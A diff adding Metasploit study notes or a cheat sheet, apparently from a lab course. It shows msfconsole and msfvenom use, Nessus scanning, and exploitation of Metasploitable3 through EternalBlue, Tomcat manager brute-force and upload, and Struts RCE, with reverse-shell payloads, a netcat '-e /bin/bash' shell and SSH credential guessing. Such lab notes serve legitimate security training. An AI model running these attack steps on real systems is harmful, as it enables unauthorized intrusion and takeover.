@@ -1,0 +1,1004 @@
+Intro:
+
+# msfupdate
+# service postgresql status
+# service postgresql start
+# update-rc.d postgresql enable
+# msfdb init
+# msfconsole
+msf> db_rebuild_cache – searches are faster
+msf> search type:exploit eternal
+
+Debian and Katoolin option..
+
+# cd /usr/share/metasploit-framework/modules – look around
+# cd /usr/share/wordlists – password cracking wordlists
+# wc -l password.lst – word count
+88396 password.lst
+
+# dpkg -i Nessus-8.2.3-ubuntu1110_amd64.deb
+# service nessusd status
+# service nessusd start
+# netstat ap | grep nessus
+
+# msfdb init
+# msfconsole
+msf> db_rebuild_cache
+msf> help
+msf> search type:exploit cve:2017 platform:windows
+msf> show payloads – use more specific searches
+
+Core Commands:
+
+msf> banner – just shows banner
+msf> cd Desktop – change directory
+msf> pwd
+msf> clear
+msf> color false – turns off color
+msf> color true
+msf> connect  – like netcat
+Ctrl+Shift+T – open a new terminal
+# nc -nlvp 4444 -e /bin/bash
+msf> connect 192.168.1.3 4444
+Ctrl+D – to kill terminal tab
+msf> get – used to get value of one or more variables
+msf> getg – get global variables
+msf> search type:exploit firefox
+msf> use exploit/firefox/local/exec_shellcode
+msf> exploit(firefox/local/exec_shellcode) > show options
+msf5 exploit(firefox/local/exec_shellcode) > set SESSION 1
+SESSION => 1
+msf5 exploit(firefox/local/exec_shellcode) > options
+msf5 exploit(firefox/local/exec_shellcode) > set SESSION 2
+SESSION => 2
+msf5 exploit(firefox/local/exec_shellcode) > options
+msf5 exploit(firefox/local/exec_shellcode) > get sessionexit
+session => 2
+msf5 exploit(firefox/local/exec_shellcode) > back -goes back out of exploit
+msf5 >
+msf5 > use exploit/firefox/local/exec_shellcode
+msf5 exploit(firefox/local/exec_shellcode) > setg session 3 – sets global variable
+session => 3
+msf5 exploit(firefox/local/exec_shellcode) > get session
+session => 3
+msf5 exploit(firefox/local/exec_shellcode) > getg session
+session => 3
+msf5 exploit(firefox/local/exec_shellcode) > back
+msf5 > getg session
+session => 3
+msf5 > get session
+session => 3
+msf5 > unsetg session – unsets global variable
+Unsetting session...
+msf5 > getg session
+session =>
+msf5 > sessions – lists active sessions
+Active sessions
+===============
+No active sessions.
+msf5 > sessions -l – same as above
+Active sessions
+===============
+No active sessions.
+msf5 > sessions -k 1 – kills a specific session
+[*] Killing the following session(s): 1
+[-] Invalid session identifier: 1
+msf5 > sessions -K – kills all sessions
+[*] Killing all sessions...
+msf5 > history – shows all commands typed into metasploit
+msf5 > load nessus
+[*] Nessus Bridge for Metasploit
+[*] Type nessus_help for a command listing
+[*] Successfully loaded plugin: Nessus
+msf5 > help nessus
+msf5 > unload nessus
+Unloading plugin nessus...unloaded.
+msf5 > grep nessus history
+38  load nessus
+39  help nessus
+40  unload nessus
+41  grep nessus history
+msf5 > save
+Saved configuration to: /root/.msf4/config
+msf5 > irb – interactive ruby shell allows us to work with metasploit apis
+[*] Starting IRB shell...
+[*] You are in the "framework" object
+msf5 > route – allows us to route traffic to a different subnet
+[*] There are currently no routes defined.
+msf5 > threads – shows active threads
+
+Background Threads
+==================
+   ID  Status  Critical  Name                Started
+   --  ------  --------  ----                -------
+   0   sleep   True      SessionScheduler-1  2019-04-07 04:44:50 -0400
+   1   sleep   True      SessionScheduler-2  2019-04-07 04:44:50 -0400
+   2   sleep   True      SessionScheduler-3  2019-04-07 04:44:50 -0400
+   3   sleep   True      SessionScheduler-4  2019-04-07 04:44:50 -0400
+   4   sleep   True      SessionScheduler-5  2019-04-07 04:44:50 -0400
+   5   sleep   True      SessionManager      2019-04-07 04:44:50 -0400
+msf5 > sleep 3 – useful in scripts to wait a few seconds for an operation
+msf5 > spool /tmp/spooling – records all input and output of metasploit to a file
+[*] Spooling to file /tmp/spooling...
+msf5 > search type:exploit cve:2017
+msf5 > spool off
+[*] Spooling is now disabled
+# cat /tmp/spooling – shows command output above
+msf5 > version
+Framework: 5.0.15-dev
+Console  : 5.0.15-dev
+msf5 > quit
+
+Module Commands:
+
+msf5 > help module
+Module Commands
+===============
+    Command       Description
+    -------       -----------
+    advanced      Displays advanced options for one or more modules
+    back          Move back from the current context
+    info          Displays information about one or more modules
+    loadpath      Searches for and loads modules from a path
+    options       Displays global options or for one or more modules
+    popm          Pops the latest module off the stack and makes it active
+    previous      Sets the previously loaded module as the current module
+    pushm         Pushes the active or list of modules onto the module stack
+    reload_all    Reloads all modules from all defined module paths
+    search        Searches module names and descriptions
+    show          Displays modules of a given type, or all modules
+    use           Selects a module by name
+msf5 > help core
+Core Commands
+=============
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    banner        Display an awesome metasploit banner
+    cd            Change the current working directory
+    color         Toggle color
+    connect       Communicate with a host
+    exit          Exit the console
+    get           Gets the value of a context-specific variable
+    getg          Gets the value of a global variable
+    grep          Grep the output of another command
+    help          Help menu
+    history       Show command history
+    load          Load a framework plugin
+    quit          Exit the console
+    repeat        Repeat a list of commands
+    route         Route traffic through a session
+    save          Saves the active datastores
+    sessions      Dump session listings and display information about sessions
+    set           Sets a context-specific variable to a value
+    setg          Sets a global variable to a value
+    sleep         Do nothing for the specified number of seconds
+    spool         Write console output into a file as well the screen
+    threads       View and manipulate background threads
+    unload        Unload a framework plugin
+    unset         Unsets one or more context-specific variables
+    unsetg        Unsets one or more global variables
+    version       Show the framework and console library version numbers
+msf5 > search type:exploit eternal
+msf5 > use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) > show info – shows info on module
+msf5 exploit(windows/smb/ms17_010_eternalblue) > options – shows basic options of module
+msf5 exploit(windows/smb/ms17_010_eternalblue) > advanced – shows advanced options of module
+# hostname -I
+10.0.2.15
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.0.2.15
+rhost => 10.0.2.15
+msf5 exploit(windows/smb/ms17_010_eternalblue) > options
+msf5 exploit(windows/smb/ms17_010_eternalblue) > check – checks if host is vulnerable
+msf5 exploit(windows/smb/ms17_010_eternalblue) > run – runs exploit
+msf5 exploit(windows/smb/ms17_010_eternalblue) > pushm – pushes module onto stack
+msf5 exploit(windows/smb/ms17_010_eternalblue) > use exploit/multi/handler
+msf5 exploit(multi/handler) > pushm
+msf5 exploit(multi/handler) > previous – returns to previous module on stack
+msf5 exploit(windows/smb/ms17_010_eternalblue) > previous
+msf5 exploit(multi/handler) > use windows/smtp/wmailserver
+msf5 exploit(windows/smtp/wmailserver) > pushm
+msf5 exploit(windows/smtp/wmailserver) > use multi/handler
+msf5 exploit(multi/handler) > pushm
+msf5 exploit(multi/handler) > use windows/smb/psexec
+msf5 exploit(windows/smb/psexec) > popm – pops module off of stack
+msf5 exploit(multi/handler) > popm
+msf5 exploit(windows/smtp/wmailserver) > popm
+msf5 exploit(multi/handler) > popm
+msf5 exploit(windows/smb/ms17_010_eternalblue) > popm
+[-] There isn't anything to pop, the module stack is empty
+msf5 exploit(windows/smb/ms17_010_eternalblue) > previous – returning to previous modules
+msf5 exploit(multi/handler) > previous
+msf5 exploit(windows/smb/ms17_010_eternalblue) > previous
+msf5 exploit(multi/handler) > back
+msf5 > pushm windows/smtp/wmailserver multi/handler windows/smb/psexec
+msf5 > popm
+msf5 exploit(windows/smb/psexec) > popm
+msf5 exploit(multi/handler) > popm
+msf5 exploit(windows/smtp/wmailserver) > popm
+[-] There isn't anything to pop, the module stack is empty
+msf5 exploit(windows/smtp/wmailserver) > edit – edits current module
+
+Payload Commands:
+
+msf5 > use exploit/windows/smb/ms17_010_eternalblue
+msf5 exploit(windows/smb/ms17_010_eternalblue) > options
+msf5 exploit(windows/smb/ms17_010_eternalblue) > show payloads
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms17_010_eternalblue) > options
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.0.2.15
+rhost => 10.0.2.15
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.0.2.15
+lhost => 10.0.2.15
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set lport 4444
+lport => 4444
+msf5 exploit(windows/smb/ms17_010_eternalblue) > options
+msf5 exploit(windows/smb/ms17_010_eternalblue) > use multi/handler
+msf5 exploit(multi/handler) > options
+msf5 exploit(multi/handler) > info
+msf5 exploit(multi/handler) > show payloads
+msf5 exploit(multi/handler) > grep linux/x64/meterpreter show payloads
+msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > options
+msf5 exploit(multi/handler) > setg lhost 10.0.2.15
+lhost => 10.0.2.15
+msf5 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf5 exploit(multi/handler) > options
+msf5 exploit(multi/handler) > run -j – runs as a job in the background
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.0.2.15:4444
+msf5 exploit(multi/handler) > jobs – lists all jobs
+Jobs
+====
+  Id  Name                    Payload                            Payload opts
+  --  ----                    -------                            ------------
+  0   Exploit: multi/handler  linux/x64/meterpreter/reverse_tcp  tcp://10.0.2.15:4444
+msf5 exploit(multi/handler) > back
+msf5 >
+# msfvenom --platform linux --payload linux/x64/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 --format elf -o exploit_me
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 129 bytes
+Final size of elf file: 249 bytes
+Saved as: exploit_me
+# chmod +x exploit_me
+# ./exploit_me
+msf5 >
+[*] Sending stage (3021284 bytes) to 10.0.2.15
+[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 10.0.2.15:41208) at 2019-04-07 06:50:08 -0400
+msf5 > sessions
+Active sessions
+===============
+  Id  Name  Type                   Information                                           Connection
+  --  ----  ----                   -----------                                           ----------
+  1         meterpreter x64/linux  uid=0, gid=0, euid=0, egid=0 @ linux-red.localdomain  10.0.2.15:4444 -> 10.0.2.15:41208 (10.0.2.15)
+msf5 > sessions 1
+[*] Starting interaction with 1...
+meterpreter > help
+meterpreter > getuid – check privilege level of machine
+Server username: uid=0, gid=0, euid=0, egid=0
+meterpreter > shell
+Process 5026 created.
+Channel 1 created.
+pwd
+/root
+exit
+
+Meterpreter Commands:
+
+meterpreter > background
+[*] Backgrounding session 1…
+msf5 exploit(multi/handler) > sessions
+msf5 exploit(multi/handler) > sessions 1
+[*] Starting interaction with 1...
+meterpreter > getuid
+Server username: uid=0, gid=0, euid=0, egid=0
+meterpreter > shell
+Process 5140 created.
+Channel 2 created.
+pwd
+/root
+whoami
+root
+cd /var/log
+ls -la
+exit – exits the shell but doesn’t kill the meterpreter session
+meterpreter > sysinfo
+Computer     : linux-red.localdomain
+OS           : Kali kali-rolling (Linux 4.19.0-kali4-amd64)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+meterpreter > ps – shows all processes on machine
+meterpreter > migrate 928 – switch into another process
+meterpreter > load  – press Tab key after load to see available options
+meterpreter > load sniffer
+Loading extension sniffer...
+Success.
+meterpreter > run – Press Tab 2 times in quick succession to see options
+Display all 131 possibilities? (y or n)y
+meterpreter > run post/linux/gather/checkvm
+[*] Gathering System info ....
+[+] This appears to be a 'VirtualBox' virtual machine
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(multi/handler) > use post/linux/gather/checkvm
+msf5 post(linux/gather/checkvm) > options
+Module options (post/linux/gather/checkvm):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+msf5 post(linux/gather/checkvm) > set session 1
+session => 1
+msf5 post(linux/gather/checkvm) > run
+[*] Gathering System info ....
+[+] This appears to be a 'VirtualBox' virtual machine
+[*] Post module execution completed
+
+Msfvenom Commands:
+
+# msfvenom --help
+MsfVenom - a Metasploit standalone payload generator.
+Also a replacement for msfpayload and msfencode.
+Usage: /usr/bin/msfvenom [options] <var=val>
+Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
+
+Options:
+    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
+    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
+        --list-options               List --payload <value>'s standard, advanced and evasion options
+    -f, --format          <format>   Output format (use --list formats to list)
+    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
+        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
+        --smallest                   Generate the smallest possible payload using all available encoders
+        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
+        --encrypt-key     <value>    A key to be used for --encrypt
+        --encrypt-iv      <value>    An initialization vector for --encrypt
+    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
+        --platform        <platform> The platform for --payload (use --list platforms to list)
+    -o, --out             <path>     Save the payload to a file
+    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
+    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
+        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
+    -s, --space           <length>   The maximum size of the resulting payload
+        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
+    -i, --iterations      <count>    The number of times to encode the payload
+    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
+    -x, --template        <path>     Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
+    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
+    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
+    -h, --help                       Show this message
+# msfvenom --list payloads | grep meterpreter
+# msfvenom --payload linux/x64/meterpreter/reverse_tcp –-list-options
+# msfvenom --payload linux/x64/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 --format elf -o exploit_me
+# msfvenom --list payloads | grep php
+# msfvenom --payload php/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444
+# msfvenom –help
+# msfvenom --payload windows/meterpreter/reverse_tcp --format c –var-name=myvarname - generate shellcode payload
+
+Resource Scripts and backend commands:
+
+# msfconsole
+Press Ctrl+Z to put it in the background
+# cd Desktop
+# nano stub
+use multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost 10.0.2.15
+set lport 4444
+run -j
+# fg – show jobs in background
+msfconsole	(wd: ~)
+pwd
+pwd
+[*] exec: pwd
+/root/Desktop
+msf5 > resource stub – load resource stub file created earlier
+[*] Processing /root/Desktop/stub for ERB directives.
+resource (/root/Desktop/stub)> use multi/handler
+resource (/root/Desktop/stub)> set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+resource (/root/Desktop/stub)> set lhost 10.0.2.15
+lhost => 10.0.2.15
+resource (/root/Desktop/stub)> set lport 4444
+lport => 4444
+resource (/root/Desktop/stub)> run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+[*] Started reverse TCP handler on 10.0.2.15:4444
+msf5 exploit(multi/handler) > jobs
+Jobs
+====
+  Id  Name                    Payload                            Payload opts
+  --  ----                    -------                            ------------
+  0   Exploit: multi/handler  linux/x64/meterpreter/reverse_tcp  tcp://10.0.2.15:4444
+msf5 exploit(multi/handler) > jobs -K
+Stopping all jobs...
+msf5 exploit(multi/handler) > exit
+# msfconsole --resource stub – load resource file via msfconsole
+# msfconsole
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set lhost 10.0.2.15
+lhost => 10.0.2.15
+msf5 exploit(multi/handler) > set lport 4444
+lport => 4444
+msf5 exploit(multi/handler) > run -j
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+[*] Started reverse TCP handler on 10.0.2.15:4444
+msf5 exploit(multi/handler) > makerc /root/Desktop/win_stub – save commands to resource file
+[*] Saving last 5 commands to /root/Desktop/win_stub ...
+
+Database Backend Commands:
+
+msf5 > help workspace
+Usage:
+    workspace                  List workspaces
+    workspace -v               List workspaces verbosely
+    workspace [name]           Switch workspace
+    workspace -a [name] ...    Add workspace(s)
+    workspace -d [name] ...    Delete workspace(s)
+    workspace -D               Delete all workspaces
+    workspace -r <old> <new>   Rename workspace
+    workspace -h               Show this help information
+msf5 > workspace -v
+Workspaces
+==========
+current  name     hosts  services  vulns  creds  loots  notes
+-------  ----     -----  --------  -----  -----  -----  -----
+*        default  1      0         1      0      0      1
+msf5 > workspace -a test
+[*] Added workspace: test
+[*] Workspace: test
+msf5 > workspace -v
+Workspaces
+==========
+current  name     hosts  services  vulns  creds  loots  notes
+-------  ----     -----  --------  -----  -----  -----  -----
+         default  1      0         1      0      0      1
+*        test     0      0         0      0      0      0
+msf5 > workspace default – switch back to default workspace
+[*] Workspace: default
+msf5 > help hosts
+Usage: hosts [ options ] [addr1 addr2 ...]
+OPTIONS:
+  -a,--add          Add the hosts instead of searching
+  -d,--delete       Delete the hosts instead of searching
+  -c <col1,col2>    Only show the given columns (see list below)
+  -C <col1,col2>    Only show the given columns until the next restart (see list below)
+  -h,--help         Show this help information
+  -u,--up           Only show hosts which are up
+  -o <file>         Send output to a file in csv format
+  -O <column>       Order rows by specified column number
+  -R,--rhosts       Set RHOSTS from the results of the search
+  -S,--search       Search string to filter by
+  -i,--info         Change the info of a host
+  -n,--name         Change the name of a host
+  -m,--comment      Change the comment of a host
+  -t,--tag          Add or specify a tag to a range of hosts
+
+Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
+msf5 > hosts
+Hosts
+=====
+address    mac  name                   os_name                                       os_flavor  os_sp  purpose  info  comments
+-------    ---  ----                   -------                                       ---------  -----  -------  ----  --------
+10.0.2.15       linux-red.localdomain  Kali kali-rolling (Linux 4.19.0-kali4-amd64)                    server
+msf5 > loot
+Loot
+====
+host  service  type  name  content  info  path
+----  -------  ----  ----  -------  ----  ----
+msf5 > notes
+Notes
+=====
+
+ Time                     Host       Service  Port  Protocol  Type                         Data
+ ----                     ----       -------  ----  --------  ----                         ----
+ 2019-04-07 10:50:08 UTC  10.0.2.15                           host.os.session_fingerprint  {:name=>"linux-red.localdomain", :os=>"Kali kali-rolling (Linux 4.19.0-kali4-amd64)", :arch=>"x64"}
+msf5 > services
+msf5 > vulns
+msf5 > db_nmap -sC -A -n -Pn 127.0.0.1 – nmap scan of local host
+msf5 > workspace -v
+msf5 > hosts
+msf5 > services
+msf5 > notes
+msf5 > help db_export
+Usage:
+    db_export -f <format> [filename]
+    Format can be one of: xml, pwdump
+[-] No output file was specified
+msf5 > db_export -f xml /root/Desktop/text.xml – export workspace to xml
+[*] Starting export of workspace default to /root/Desktop/text.xml [ xml ]...
+[*] Finished export of workspace default to /root/Desktop/text.xml [ xml ]...
+msf5 > workspace -D – delete all workspaces
+[*] Deleted workspace: default
+[*] Recreated the default workspace
+[*] Deleted workspace: test
+msf5 > db_import /root/Desktop/text.xml
+msf5 > workspace -v
+msf5 > workspace -a test
+[*] Added workspace: test
+[*] Workspace: test
+msf5 > db_import /root/Desktop/text.xml
+[*] Importing 'Metasploit XML' data
+[*] Importing host 10.0.2.15
+[*] Importing host 127.0.0.1
+[*] Successfully imported /root/Desktop/text.xml
+msf5 > workspace -d default
+[*] Deleted workspace: default
+[*] Recreated the default workspace
+
+Information Gathering:
+
+# netdiscover
+# nmap -O 172.28.128.3
+# msfconsole
+msf5 > workspace -a metasploitable3 – create workspace for metasploitable
+[*] Added workspace: metasploitable3
+[*] Workspace: metasploitable3
+msf5 > db_nmap -Pn -sT -p- -sV -sC -O 172.28.128.3
+msf5 > workspace -v
+msf5 > services
+msf5 > notes
+msf5 > search type:auxiliary ssh
+msf5 > use auxiliary/scanner/ssh/ssh_enumusers
+msf5 auxiliary(scanner/ssh/ssh_enumusers) > options
+msf5 auxiliary(scanner/ssh/ssh_enumusers) > setg rhosts 172.28.128.3
+rhosts => 172.28.128.3
+msf5 auxiliary(scanner/ssh/ssh_enumusers) > setg user_file /usr/share/wordlists/metasploit/unix_users.txt
+user_file => /usr/share/wordlists/metasploit/unix_users.txt
+msf5 auxiliary(scanner/ssh/ssh_enumusers) > run
+msf5 auxiliary(scanner/ssh/ssh_enumusers) > search type:auxiliary ssh_login
+msf5 auxiliary(scanner/ssh/ssh_enumusers) > use auxiliary/scanner/ssh/ssh_login
+msf5 auxiliary(scanner/ssh/ssh_login) > options
+msf5 auxiliary(scanner/ssh/ssh_login) > set user_as_pass true
+msf5 auxiliary(scanner/ssh/ssh_login) > run
+# ssh vagrant@172.28.128.3
+msf5 auxiliary(scanner/ssh/ssh_login) > search type:auxiliary java_rmi
+msf5 auxiliary(scanner/ssh/ssh_login) > use auxiliary/gather/java_rmi_registry
+msf5 auxiliary(gather/java_rmi_registry) > options
+msf5 auxiliary(gather/java_rmi_registry) > set rport 1617
+rport => 1617
+msf5 auxiliary(gather/java_rmi_registry) > save
+Saved configuration to: /root/.msf4/config
+msf5 auxiliary(gather/java_rmi_registry) > run
+msf5 auxiliary(gather/java_rmi_registry) > use auxiliary/scanner/misc/java_rmi_server
+msf5 auxiliary(scanner/misc/java_rmi_server) > options
+msf5 auxiliary(scanner/misc/java_rmi_server) > set rport 1617
+msf5 auxiliary(scanner/misc/java_rmi_server) > run
+msf5 auxiliary(scanner/misc/java_rmi_server) > workspace -v
+msf5 auxiliary(scanner/misc/java_rmi_server) > vulns
+msf5 auxiliary(scanner/misc/java_rmi_server) > creds
+msf5 auxiliary(scanner/misc/java_rmi_server) > notes
+msf5 auxiliary(scanner/misc/java_rmi_server) > services
+msf5 auxiliary(scanner/misc/java_rmi_server) > search type:auxiliary glassfish
+
+Vulnerability Assessment:
+
+# service nessusd start
+# service –status-all | grep nessus
+# netstat -antp | grep nessus
+msf5 auxiliary(scanner/misc/java_rmi_server) > back
+msf5 > load nessus
+[*] Nessus Bridge for Metasploit
+[*] Type nessus_help for a command listing
+[*] Successfully loaded plugin: Nessus
+msf5 > nessus_connect admin:343235df@localhost:8834
+[*] Connecting to https://localhost:8834/ as admin
+[*] User admin authenticated successfully.
+msf5 > nessus_policy_list
+Policy ID  Name                    Policy UUID
+---------  ----                    -----------
+4          metasploitable3_policy  ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66
+msf5 > nessus_scan_new -h
+[*] nessus_scan_new <UUID of Policy> <Scan name> <Description> <Targets>
+[*] Use nessus_policy_list to list all available policies with their corresponding UUIDs
+msf5 > nessus_scan_new ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66 "METASPLOITABLE3" "No Description Available" 172.28.128.3
+msf5 > nessus_scan_launch 7
+msf5 > nessus_db_import 7
+msf5 > search type:exploit ElasticSearch
+msf5 > info exploit/multi/elasticsearch/script_mvel_rce
+msf5 > info exploit/multi/elasticsearch/search_groovy_script
+msf5 > search type:exploit ManageEngine cve:2015
+msf5 > info exploit/windows/http/manage_engine_opmanager_rce
+msf5 > grep console search type:exploit rails
+msf5 > info exploit/multi/http/rails_web_console_v2_code_exec
+# searchsploit ruby on rails
+# searchsploit -x 39792 – examines exploit
+msf5 > search type:auxiliary dir_scanner
+msf5 > use auxiliary/scanner/http/dir_scanner
+msf5 auxiliary(scanner/http/dir_scanner) > options
+msf5 auxiliary(scanner/http/dir_scanner) > set dictionary /usr/share/wordlists/dirb/common.txt
+dictionary => /usr/share/wordlists/dirb/common.txt
+msf5 auxiliary(scanner/http/dir_scanner) > set rport 8282
+rport => 8282
+msf5 auxiliary(scanner/http/dir_scanner) > run
+msf5 auxiliary(scanner/http/dir_scanner) > set dictionary /usr/share/wordlists/dirb/big.txt
+msf5 > search type:auxiliary webdav
+msf5 > use auxiliary/scanner/http/webdav_scanner
+msf5 auxiliary(scanner/http/webdav_scanner) > options
+msf5 auxiliary(scanner/http/webdav_scanner) > set rport 8585
+rport => 8585
+msf5 auxiliary(scanner/http/webdav_scanner) > set path /uploads/
+path => /uploads/
+msf5 auxiliary(scanner/http/webdav_scanner) > run
+# curl http://192.168.1.4:8585/uploads/ --upload-file test.txt – uploads file with curl
+# wpscan --update – update wpscan
+# wpscan –url http://192.168.1.4:8585/wordpress -e vp,u
+# wpscan –url http://192.168.1.4:8585/wordpress –-wordlist /usr/share/wordlists/metasploit/password.lst
+
+Exploitation:
+
+# searchsploit -u – update searchsploit
+# searchsploit metasploit
+# searchsploit metasploit | grep -i shellshock – grep -i returns case insensitive matches
+# searchsploit shellshock
+# searchsploit 34900 -x
+# searchsploit -m 34900 – save exploit
+# python 34900.py – run
+# cd /usr/share/wordlists/metasploit
+# nano metasploitable.txt
+# readlink -f metasploitable.txt – copy path to clipboard
+
+msf5 > search type:auxiliary tomcat
+msf5 > use auxiliary/scanner/http/tomcat_mgr_login
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > options
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/metasploitable.txt
+pass_file => /usr/share/metasploit-framework/data/wordlists/metasploitable.txt
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set user_file /usr/share/metasploit-framework/data/wordlists/metasploitable.txt
+user_file => /usr/share/metasploit-framework/data/wordlists/metasploitable.txt
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > set user_as_pass true
+user_as_pass => true
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > run
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > search type:exploit tomcat_mgr_upload
+msf5 auxiliary(scanner/http/tomcat_mgr_login) > use exploit/multi/http/tomcat_mgr_upload
+msf5 exploit(multi/http/tomcat_mgr_upload) > options
+msf5 exploit(multi/http/tomcat_mgr_upload) > setg rhost 192.168.1.4
+rhost => 192.168.1.4
+msf5 exploit(multi/http/tomcat_mgr_upload) > set rport 8282
+rport => 8282
+msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword sploit
+HttpPassword => sploit
+msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername sploit
+HttpUsername => sploit
+msf5 exploit(multi/http/tomcat_mgr_upload) > show payloads
+msf5 exploit(multi/http/tomcat_mgr_upload) > set payload java/meterpreter/reverse_http
+payload => java/meterpreter/reverse_http
+msf5 exploit(multi/http/tomcat_mgr_upload) > options
+msf5 exploit(multi/http/tomcat_mgr_upload) > set lhost 192.168.1.3
+lhost => 192.168.1.3
+msf5 exploit(multi/http/tomcat_mgr_upload) > set lport 4444
+lport => 4444
+msf5 exploit(multi/http/tomcat_mgr_upload) > run
+meterpreter > getuid
+meterpreter > exit
+msf5 exploit(multi/http/tomcat_mgr_upload) > show info
+msf5 exploit(multi/http/tomcat_mgr_upload) > set target 1
+msf5 exploit(multi/http/tomcat_mgr_upload) > show payloads
+msf5 exploit(multi/http/tomcat_mgr_upload) > set payload windows/meterpreter_reverse_tcp
+payload => windows/meterpreter_reverse_tcp
+msf5 exploit(multi/http/tomcat_mgr_upload) > run
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > exit
+msf5 > search type:exploit struts
+msf5 > use exploit/multi/http/struts_dmi_rest_exec
+msf5 exploit(multi/http/struts_dmi_rest_exec) > options
+msf5 exploit(multi/http/struts_dmi_rest_exec) > set rport 8282
+rport => 8282
+msf5 exploit(multi/http/struts_dmi_rest_exec) > setg rhost 10.0.3.6
+msf5 exploit(multi/http/struts_dmi_rest_exec) > show payloads
+msf5 exploit(multi/http/struts_dmi_rest_exec) > set payload java/meterpreter/reverse_http
+payload => java/meterpreter/reverse_http
+msf5 exploit(multi/http/struts_dmi_rest_exec) > set lhost 10.0.3.5
+lhost => 10.0.3.5
+msf5 exploit(multi/http/struts_dmi_rest_exec) > set lport 4444
+lport => 4444
+msf5 exploit(multi/http/struts_dmi_rest_exec) > run
+meterpreter > exit
+msf5 exploit(multi/http/struts_dmi_rest_exec) > show info
+msf5 exploit(multi/http/struts_dmi_rest_exec) > set target 0
+target => 0
+msf5 exploit(multi/http/struts_dmi_rest_exec) > show payloads
+msf5 exploit(multi/http/struts_dmi_rest_exec) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/http/struts_dmi_rest_exec) > options
+msf5 exploit(multi/http/struts_dmi_rest_exec) > run
+
+
+Installation
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+or docker
+sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
+Sessions
+CTRL+Z   -> Session in Background
+sessions -> List sessions
+sessions -i session_number -> Interact with Session with id
+sessions -u session_number -> Upgrade session to a meterpreter
+sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-> Upgrade session to a meterpreter
+
+sessions -c cmd           -> Execute a command on several sessions
+sessions -i 10-20 -c "id" -> Execute a command on several sessions
+Multi/handler in background (screen/tmux)
+ExitOnSession : the handler will not exit if the meterpreter dies.
+screen -dRR
+sudo msfconsole
+
+use exploit/multi/handler
+set PAYLOAD generic/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j
+
+[ctrl+a] + [d]
+Meterpreter - Basic
+Generate a meterpreter
